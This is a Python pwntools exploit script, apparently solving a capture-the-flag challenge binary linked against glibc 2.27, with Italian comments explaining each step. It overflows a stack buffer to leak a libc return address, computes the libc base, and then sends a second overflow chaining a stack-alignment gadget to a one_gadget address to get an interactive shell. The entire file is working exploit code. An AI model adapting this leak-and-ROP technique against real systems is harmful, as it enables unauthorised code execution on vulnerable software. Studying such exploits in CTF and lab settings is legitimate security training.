#!/usr/bin/env python3
from pwn import *

EXE_FILENAME='./tbg_files/the_best_game/bg3_docker/best_game3-libc-2.27'
LD_FILENAME = './tbg_files/the_best_game/bg3_docker/ld-2.27.so'
LIBC_FILENAME = './tbg_files/the_best_game/bg3_docker/libc-2.27.so'

exe = context.binary = ELF(EXE_FILENAME)

# libc = exe.libc
argv = [EXE_FILENAME]
envp = {}

EIP_OFFSET = 40
LIBC_LEAK = EIP_OFFSET + 16 #distanza tra inizio del EIP_OFFSET + 8 byte per il EIP + 8 byte per EBP del main
POP_RDI = 0x000000000002155f # ropper --file ./libc-2.27.so --search 'pop rdi'
RET = POP_RDI+1
ONE_GADGET = 0x4f322 #one_gadget ./libc-2.27.so


"""g
$ gdb --args ./ld-2.27.so --library-path ./libc-2.27.so ./best_game3-libc-2.27
"""
def start():
	gdbscript = '''
	b *(quiz+1)
	continue
	telescope
	'''
	if args.GDB:
		return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
	else:
		return process([LD_FILENAME, EXE_FILENAME],
               env={"LD_LIBRARY_PATH": LIBC_FILENAME})


io = start()

"""
non stai sovrascrivendo solo il return address di quiz. Continuando ad andare avanti nello stack, 
arrivi anche al frame precedente, cioè quello di main, che a sua volta è stato chiamato da __libc_start_main.
"""
io.sendlineafter(b'# ', (b'a'*(LIBC_LEAK-1)) ) # sendline() aggiunge automaticamente un byte finale \n
io.recvuntil(b'aaaa\n')
l = io.clean()
i = l.find(b'Is it')

log.info(f"Received data: {l}")
log.info(f"Index of 'Is it': {i}")

assert i > 0
leak = l[:i].ljust(8, b'\x00') #

log.info(f"Leak: {leak}") # indirizzo di una funzione all’interno della libc.

libc_base = u64(leak) - 0x21b97 #  0x21b97 è l’offset noto di quella funzione dentro libc-2.27.
								#return address sullo stack è un'istruzione interna di __libc_start_main,
								# Biogna vedere a che punto della __libc_start_main  il main torna dopo aver temrminato
								# objdump -T libc-2.27.so | grep __libc_start_main

log.info(f"Libc base address: {hex(libc_base)}")


io.sendline(
    			 b'a'*EIP_OFFSET 
                 + p64(libc_base + RET) #to align the stack 
                 + p64(libc_base + ONE_GADGET) 
            )
io.sendlineafter(b'# ', b'HZD')
io.interactive()